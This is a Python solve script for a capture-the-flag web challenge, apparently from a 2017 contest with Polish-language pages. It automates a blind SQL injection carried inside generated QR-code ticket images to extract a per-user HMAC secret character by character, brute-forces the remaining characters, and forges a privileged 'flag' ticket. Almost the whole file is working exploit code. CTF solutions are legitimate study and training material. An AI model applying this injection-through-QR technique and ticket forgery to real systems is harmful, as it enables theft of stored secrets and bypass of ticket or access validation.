import hashlib
import hmac
import io
import itertools
import qrcode
import random
import re
import requests
import string
from PIL import Image


CODE_DIM = (400, 400)
OFFSET = (350, 50)
TICKET_PATH = 'free_ticket.png'

LOGIN_URL = 'https://easy.web.uw2017.p4.team/login'
REGISTER_URL = 'https://easy.web.uw2017.p4.team/register'
VALIDATE_URL = 'https://easy.web.uw2017.p4.team/validate'
FREE_TICKET_URL = 'https://easy.web.uw2017.p4.team/free_ticket'

QUERY_OK = 'i znajduje się w naszej bazie danych'
QUERY_WRONG = 'i nie znajduje się w naszej bazie danych'
TICKET_OK = 'Twój bilet jest poprawny'
TICKET_WRONG = 'Twój bilet ma niepoprawny typ'

TICKET_FLAG = 'flaga'
TICKET_FREE = 'wejsciowka_do_metra'


def create_code(content):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_L)
    qr.add_data(content)
    qr.make(fit=True)
    return qr.make_image().resize(CODE_DIM)


def create_ticket(content):
    img = Image.open(TICKET_PATH)
    code = create_code(content)
    img.paste(code, OFFSET)
    return img


def transform_to_byte_file(image):
    imgByteArr = io.BytesIO()
    image.save(imgByteArr, 'PNG')
    return imgByteArr.getvalue()


def create_ticket_file(content):
    img = create_ticket(content)
    return transform_to_byte_file(img)


def hmac_ticket(user_secret, ticket_type):
    return hmac.new(user_secret.encode('utf-8'), ticket_type.encode('utf-8'), hashlib.sha256).hexdigest()


def get_random_string(n):
    ALPHABET = list(string.ascii_letters + string.digits)

    return ''.join(random.choice(ALPHABET) for _ in range(n))


class EasyWeb():
    sess = None
    reg = re.compile("<div class=\"alert alert-info\">([\w\W]*?)</div>")
    uname_hash = None
    free_ticket = None

    def register(self, username, password):
        user_data = {
            'username': username,
            'password': password,
            'repeat_password': password,
        }

        self.sess = requests.session()

        self.sess.post(REGISTER_URL, data=user_data)


    def save_free_ticket(self):
        with open(TICKET_PATH, 'wb') as f:
            r = self.sess.get(FREE_TICKET_URL)
            r.raw.decode_content = True
            f.write(r.content)


    def decode_free_ticket(self):
        with open(TICKET_PATH, 'rb') as ticket:
            files = {
                'file': ('ticket.png', ticket)
            }
            data = {
                'outputformat': 'json'
            }

            response = self.sess.post("http://api.qrserver.com/v1/read-qr-code/", files=files, data=data)

            self.free_ticket = response.json()[0]['symbol'][0]['data']


    def login(self, username, password):
        login_data = {
            'username': username,
            'password': password,
        }

        self.uname_hash = hashlib.sha256(username.encode('utf-8')).hexdigest()
        self.sess.post(LOGIN_URL, data=login_data)


    def check_ticket(self, content, print_info=False):
        ticket = create_ticket_file(content)
        files = {
            'ticket': ('ticket.png', ticket)
        }

        response = self.sess.post(VALIDATE_URL, files=files)

        if print_info:
            print(content)

            info = self.reg.search(response.text)
            if info:
                print(info.group(1).strip())
            else:
                print(response.text)

        return QUERY_OK in response.text


    def try_nth_char(self, n, ch):
        return self.check_ticket('a" or substring((SELECT user_secret FROM {} limit 1), {}, 1) <= "{}"#'
            .format(self.uname_hash, n, ch))


    def find_nth_char(self, n):
        ALPHABET = '0123456789abcdef'

        def bin_search(b, e):
            if b == e:
                return b
            else:
                m = (b + e) // 2
                if self.try_nth_char(n, ALPHABET[m]):
                    return bin_search(b, m)
                else:
                    return bin_search(m+1, e)

        i = bin_search(0, len(ALPHABET) - 1)
        return ALPHABET[i]


    def find_partial_user_secret(self, n=32):
        user_secret = ''
        for i in range(1, n+1):
            c = self.find_nth_char(i)
            user_secret += c
            print(user_secret)

        return user_secret


    def find_user_secret(self, partial_secret, n):
        ALPHABET = '0123456789abcdef'

        for ending in itertools.product(ALPHABET, repeat=n):
            candidate = partial_secret + ''.join(ending)
            t = hmac_ticket(candidate, TICKET_FREE)
            if t == self.free_ticket:
                return candidate


def solve():
    ew = EasyWeb()
    username = get_random_string(20)
    password = get_random_string(20)

    print(username, password)

    ew.register(username, password)
    ew.login(username, password)
    ew.save_free_ticket()
    ew.decode_free_ticket()

    print(ew.free_ticket)

    partial_user_secret = ew.find_partial_user_secret(27)

    user_secret = ew.find_user_secret(partial_user_secret, 5)

    print(user_secret)

    t = hmac_ticket(user_secret, TICKET_FLAG)
    ew.check_ticket(t, print_info=True)


if __name__ == '__main__':
    solve()
